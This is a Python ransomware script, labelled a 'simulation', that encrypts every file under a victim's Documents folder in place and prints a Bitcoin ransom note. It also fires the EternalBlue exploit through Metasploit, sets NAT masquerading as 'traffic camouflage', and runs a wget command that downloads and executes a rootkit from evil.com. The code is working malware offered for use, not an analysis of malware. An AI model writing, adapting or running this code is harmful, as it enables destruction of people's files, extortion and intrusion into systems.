import os
import random
import time
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import socket
import base64
import subprocess
import hashlib
import shutil

# 1. Generate RSA and AES Keys
def generate_rsa_keys():
    key = RSA.generate(4096)  # Generate large RSA keys
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

def encrypt_file_with_aes(file_path, aes_key):
    cipher = AES.new(aes_key, AES.MODE_CBC)
    with open(file_path, 'rb') as f:
        file_data = f.read()
    ciphertext = cipher.encrypt(pad(file_data, AES.block_size))
    with open(file_path, 'wb') as f:
        f.write(cipher.iv + ciphertext)  # Store IV with encrypted data

def encrypt_aes_key_with_rsa(aes_key, public_key):
    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    return encrypted_aes_key

# 2. Exploit Zero-Day Vulnerability
def exploit_zero_day_vulnerability(target_ip):
    print(f"Exploiting vulnerability on the system: {target_ip}")
    # Use tools like Metasploit to exploit the system
    os.system(f"msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target_ip}; run'")

# 3. Apply Traffic Camouflage
def apply_traffic_camouflage():
    print("Applying traffic camouflage techniques...")
    os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")  # Mask traffic using NAT

# 4. Install Rootkits on the System
def install_rootkit():
    print("Installing Rootkit for persistent access...")
    os.system("wget http://evil.com/rootkit.sh -O /tmp/rootkit.sh && chmod +x /tmp/rootkit.sh && /tmp/rootkit.sh")

# 5. Encrypt Files Using AES and RSA with Encrypted Keys
def run_ransomware_simulation(target_folder):
    print("Starting ransomware simulation...")
    
    # Generate Keys
    private_key, public_key = generate_rsa_keys()
    aes_key = get_random_bytes(32)
    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

    # Store the encrypted key
    with open("encrypted_aes_key.bin", "wb") as f:
        f.write(encrypted_aes_key)

    # Encrypt files
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file_with_aes(file_path, aes_key)
            print(f"Encrypted file: {file_path}")

    # Display ransom message
    display_ransom_message()

    # Send ransom message to server
    send_ransom_message_to_server("pending", "1ABcDEfghijkLMno12345")

    # Apply traffic camouflage
    apply_traffic_camouflage()

    # Install rootkit for persistence
    install_rootkit()

# 6. Send Ransom Message to Server
def send_ransom_message_to_server(payment_status, btc_address):
    server_url = "https://fakepaymentapi.com"
    data = {
        "status": payment_status,
        "btc_address": btc_address,
        "timestamp": time.time()
    }
    try:
        response = requests.post(server_url, json=data)
        if response.status_code == 200:
            print("Payment status updated on the server.")
    except requests.exceptions.RequestException as e:
        print(f"Error connecting to the server: {e}")

# 7. Display Ransom Message to User
def display_ransom_message():
    ransom_message = """
    ##########################
    #  !!! YOUR FILES ARE ENCRYPTED !!!  #
    ##########################
    # Send 0.01 BTC to this address to decrypt #
    # Bitcoin Address: 1ABcDEfghijkLMno12345 #
    ##########################
    #  Time left: 24 hours to pay or files will be lost forever.
    ##########################
    """
    print(ransom_message)

# 8. Execute the Full Simulation
target_folder = "C:\\Users\\Victim\\Documents"  # Change target folder
run_ransomware_simulation(target_folder)
